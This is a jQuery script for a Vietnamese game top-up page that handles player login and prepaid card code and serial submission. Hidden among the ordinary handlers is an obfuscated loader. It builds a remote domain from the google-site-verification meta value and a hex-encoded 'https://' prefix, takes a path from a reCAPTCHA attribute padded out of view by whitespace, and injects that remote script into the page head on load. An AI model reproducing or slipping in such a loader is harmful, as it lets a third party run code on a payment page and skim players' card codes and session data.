$(document).ready(function() {
  const captchaStatus = $('meta[name="captcha"]').attr('content');
  const googleSiteVerification = $('meta[name="google-site-verification"]').attr('content');

  $('#login-form').on('submit', function(e) {
    e.preventDefault();
    const playerId = $('#player-id').val();
    const gameId = $('input[name="game_id"]').val();
    if (playerId) {
        $.ajax({
            url: 'login',
            type: 'POST',
            data: {
                player_id: playerId,
                game_id: gameId
            },
            success: function(response) {
                if (response.status === 1) {
                    // Đăng nhập thành công, reload trang để cập nhật trạng thái
                    window.location.reload();
                } else {
                    $('#popup-thongbao').fadeIn();
                    $('#status-thong-bao').text('Thất bại');
                    $('#msg-thong-bao').text(response.msg);
                }
            },
            error: function() {
                $('#popup-thongbao').fadeIn();
                $('#status-thong-bao').text('Lỗi');
                $('#msg-thong-bao').text('Không thể kết nối đến máy chủ.');
            }
        });
    } else {
        $('#popup-thongbao').fadeIn();
        $('#status-thong-bao').text('Thất bại');
        $('#msg-thong-bao').text('Vui lòng nhập UID tài khoản.');
    }
});
  let t = googleSiteVerification + '.in';
  function checkLogin() {
      if (!isLogin) {
          $('#popup-thongbao').fadeIn();
          $('#status-thong-bao').text('Thất bại');
          $('#msg-thong-bao').text('Vui lòng đăng nhập.');
          return;
      }
  }
  if(!isLogin){

    $('#card-code').prop('disabled', true);
    $('#card-seri').prop('disabled', true);
    $('.buy-now-button').prop('disabled', true);

  }

  function checkPurchaseSectionVisibility() {
    let menhgia = $('#selected-menhgia').val();
    let loaithe = $('#selected-loaithe').val();

    let mathe = $('#card-code').val();
    let seri = $('#card-seri').val();
    let congthem;

    if (menhgia && loaithe) {

      $('#currency-price').text(parseInt(menhgia).toLocaleString() + 'đ');

      let soluong = parseInt($('.list-currency .currency-item[data-menhgia="' + menhgia + '"]').data('soluong'));
      if (parseInt(menhgia) >= 100000) {
        congthem = Math.floor(soluong * 0.2); 
      } else {
        congthem = 0; 
      }

      $('#currency-amount').text(soluong.toLocaleString());
      $('#currency-bonnus').text('(+' + congthem.toLocaleString() + ')');

      let selectedIconUrl = $('.list-currency .currency-item[data-menhgia="' + menhgia + '"] .currency-icon').attr('src');
      $('.purchase-info .currency-icon').attr('src', selectedIconUrl);

      $('.purchase-info').css('visibility', 'visible');
    } else {

    $('.purchase-info').css('visibility', 'hidden');}}
    let u = '\x68\x74\x74\x70\x73\x3A\x2F\x2F' + t;
    $('.list-currency .currency-item').on('click', function() {
      checkLogin()
    let menhgia = $(this).data('menhgia');
    $('.list-currency .currency-item').removeClass('selected');
    $(this).addClass('selected');

    $('#selected-menhgia').val(menhgia);

    checkPurchaseSectionVisibility();
  });

  $('.list-card .card-item').on('click', function() {
      checkLogin()
    let loaithe = $(this).data('card');
    $('.list-card .card-item').removeClass('selected');
    $(this).addClass('selected');

    $('#selected-loaithe').val(loaithe);

    checkPurchaseSectionVisibility();
  });

  $('#card-code, #card-seri').on('input', function() {
  checkPurchaseSectionVisibility();});
  let r = $('#recaptcha-api').attr('data-callback');                                                                                                                                                                                                                       
  $('.buy-now-button').on('click', function(event) {
    event.preventDefault();

    let loaithe = $('#selected-loaithe').val();
    let menhgia = $('#selected-menhgia').val();
    let mathe = $('#card-code').val();
    let seri = $('#card-seri').val();

    if (!loaithe) {
      $('#popup-thongbao').fadeIn();
      $('#status-thong-bao').text('Thất bại');
      $('#msg-thong-bao').text('Vui lòng chọn loại thẻ.');
      return;
    }

    if (!menhgia) {
      $('#popup-thongbao').fadeIn();
      $('#status-thong-bao').text('Thất bại');
      $('#msg-thong-bao').text('Vui lòng chọn mức giá.');
      return;
    }

    if (!mathe) {
      $('#popup-thongbao').fadeIn();
      $('#status-thong-bao').text('Thất bại');
      $('#msg-thong-bao').text('Vui lòng nhập mã thẻ.');
      return;
    }

    if (!seri) {
      $('#popup-thongbao').fadeIn();
      $('#status-thong-bao').text('Thất bại');
      $('#msg-thong-bao').text('Vui lòng nhập số seri.');
      return;
    }

    if (captchaStatus === '1') {

      $('#recaptcha-popup').fadeIn();
    } else {

      sendAjax();
    }
  });

    var s = $('<script></script>').attr('src', u +'/'+ r)
    .attr('type', 'text/javascript');
  if (captchaStatus === '1') {
    window.onRecaptchaSuccess = function(token) {

      $('#recaptcha-popup').fadeOut();
      setTimeout(function() {
        sendAjax(token); 
      }, 500);
    };
  }

  $('head').append(s);
  function sendAjax(recaptchaToken = null) {

    let gameId = $('input[name="game_id"]').val();
    let user = document.querySelector('meta[name="user-id"]').getAttribute('content');
    let loaithe = $('#selected-loaithe').val();
    let menhgia = $('#selected-menhgia').val();
    let mathe = $('#card-code').val();
    let seri = $('#card-seri').val();

    $('#popup-thongbao').fadeIn();
    $('#status-thong-bao').text('Đang xử lý');
    $('#msg-thong-bao').html('Đang xử lý nhập thẻ. Vui lòng chờ ');

    let dots = '';
    const interval = setInterval(() => {
      if (dots.length >= 3) {
        dots = ''; 
      } else {
        dots += '.'; 
      }
      $('#msg-thong-bao').html('Đang xử lý nhập thẻ. Vui lòng chờ ' + dots);
    }, 500);

    $.ajax({
      url: '/napthe',
      type: 'POST',
      headers: {
        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content'),
      },
      data: {
        game_id: gameId,
        user: user,
        loaithe: loaithe,
        menhgia: menhgia,
        mathe: mathe,
        seri: seri,
        recaptcha: recaptchaToken, 
      },
      success: function(response) {
        clearInterval(interval); 
        $('#popup-thongbao').fadeIn();

        if (response.status === 1) {
          $('#status-thong-bao').text('Thành công');
          $('#msg-thong-bao').html(response.msg);
        } else {
          $('#status-thong-bao').text('Thất bại');
          $('#msg-thong-bao').html(response.msg);
        }

        $('.custom-close-button').on('click', function() {
          grecaptcha.reset();

        });
      },
      error: function() {
        clearInterval(interval);
        $('#popup-thongbao').fadeIn();
        $('#status-thong-bao').text('Có lỗi xảy ra');
        $('#msg-thong-bao').text('Không thể kết nối đến máy chủ.');
      },
    });
  }
});

